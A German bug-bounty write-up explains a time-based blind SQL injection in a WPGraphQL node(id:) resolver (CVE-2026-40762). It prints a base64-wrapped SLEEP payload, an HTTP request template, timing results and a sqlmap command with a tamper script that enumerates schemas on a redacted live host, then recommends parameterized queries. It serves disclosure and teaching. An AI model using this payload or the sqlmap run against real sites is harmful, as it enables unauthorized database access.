> Write-up · SQL-Injection (CWE-89) · CVE-2026-40762 · Juli 2026

## Zusammenfassung

Eine unauthentifizierte, zeitbasierte blinde SQL-Injection wurde in einem öffentlichen WPGraphQL-`node(id:)`-Resolver bestätigt, der von CVE-2026-40762 betroffen ist. Der injizierbare Wert ist die base64-kodierte Relay-Global-ID: Decodiert sie zu einer `user:<value>`-Kennung, erreicht der angreiferkontrollierte `<value>` den WordPress/WPGraphQL-User-Loader-SQL-Pfad und wird in einer MySQL-Abfrage ausgewertet.

Das verschafft einem entfernten Angreifer ganz ohne Authentifizierung ein Timing-Orakel, um Datenbank-Metadaten Bit für Bit zu lesen. Die Enumeration im Report blieb bewusst auf Schema-Namen beschränkt — keine Zeilen, Zugangsdaten oder PII. Host und Programm sind durchgehend redigiert.

## Warum die Global-ID die Sink ist

WPGraphQL nutzt Relay-artige opake IDs: ein base64-String, der zu `type:id` decodiert, etwa `user:123`.

Der Resolver decodierte die vom Client gelieferte ID und reichte den `id`-Teil ohne ausreichende Bereinigung zu einem User-Lookup weiter, sodass ein decodierter Wert wie `user:0) OR (… )-- -` aus der vorgesehenen Abfrage ausbrach. Da die Payload in base64 innerhalb einer normal aussehenden GraphQL-Variable steckt, rutscht sie auch an naiver Request-Inspektion vorbei — das bösartige SQL existiert erst, nachdem der Server decodiert hat.

## Proof of Concept

Der Nachweis ist eine decodierte Payload, die eine messbare Verzögerung erzwingt, getragen in der base64-ID.

Decodierte Relay-ID (konzeptionell):

```text
user:0) OR (SELECT 1 FROM (SELECT SLEEP(2))X)-- <nonce>
```

Dieser String wird base64-kodiert und als `node(id:)`-Argument gesendet:

```http
POST /blog/graphql/ HTTP/2
Host: [REDACTED-HOST]
Content-Type: application/json

{"query":"{ node(id:\"<base64-der-payload>\"){ __typename ... on User { databaseId } } }"}
```

Ein gültiger, aber injizierter Request antwortet nach ~2 Sekunden mit `200 OK`; dieselbe Payload mit `SLEEP(0)` antwortet sofort. Beides ein paar Mal wiederholt ergibt ein sauberes Signal:

| Runde | `SLEEP(0)` | `SLEEP(2)` | Delta |
| --- | ---: | ---: | ---: |
| 1 | 0,59s | 2,56s | 1,97s |
| 2 | 0,54s | 2,58s | 2,04s |
| 3 | 0,53s | 2,47s | 1,94s |

Ein konsistentes ~2-Sekunden-Delta, das dem `SLEEP`-Argument folgt, ist die Bestätigung — die Datenbank führt vom Angreifer geliefertes SQL aus.

## Das Orakel automatisieren

sqlmap bestätigt und erweitert den Fund, aber die Payload muss base64-verpackt sein, um die Sink zu erreichen, also braucht es ein kleines Tamper-Skript, das den `user:0) … -- nonce`-Wrapper neu aufbaut und vor jedem Request base64-kodiert.

Der Lauf wird bewusst schonend gehalten — nur zeitbasierte Technik, single-threaded, mit Verzögerung zwischen Requests — denn ein blindes Orakel gegen Produktion sollte vor allem das Ziel nicht stören:

```bash
sqlmap -u "https://[REDACTED-HOST]/blog/graphql/" --method=POST \
  --data='{"query":"{ node(id:\"*\"){ __typename ... on User { databaseId } } }"}' \
  --headers="Content-Type: application/json" \
  --tamper=wpgraphql_b64.py \
  --dbms=MySQL --technique=T --time-sec=8 \
  --threads=1 --delay=1 --batch --dbs
```

sqlmap bestätigte die zeitbasierte blinde MySQL-Injection und enumerierte die sichtbaren Schema-Namen aus `information_schema.schemata`.

## Auswirkung und Erkenntnisse

Unauthentifizierter Datenbank-Lesezugriff an einem öffentlichen Endpunkt ist hoch eingestuft — der CVE trägt CVSS 9.1 — selbst wenn der Nachweis bei Schema-Namen endet.

Der Report hielt die Demonstration verantwortungsvoll knapp: Er wies das Orakel nach und las Metadaten, extrahierte aber keine Tabellenzeilen, Zugangsdaten oder PII und erhob keinen RCE-Anspruch. Für mich gibt es zwei Lehren. Erstens: Opake IDs sind keine Sicherheitsgrenze — Nutzereingaben zu decodieren und einer Abfrage zu übergeben ist weiterhin Injection, base64 hin oder her. Zweitens: Der Fix ist derselbe wie seit jeher bei SQLi — parametrisierte Abfragen, damit keine noch so raffinierte `id` die Struktur der Abfrage ändern kann. Die destruktive PoC minimal und störungsfrei zu halten, macht einen solchen Fund auf einem Live-Ziel sicher vorführbar.

---

Basierend auf einem LogicalBreach-Academy-Write-up (Autor pyus3r). Das Original findest du unter [academy.logicalbreach.com](https://academy.logicalbreach.com/resources?tab=writeups).
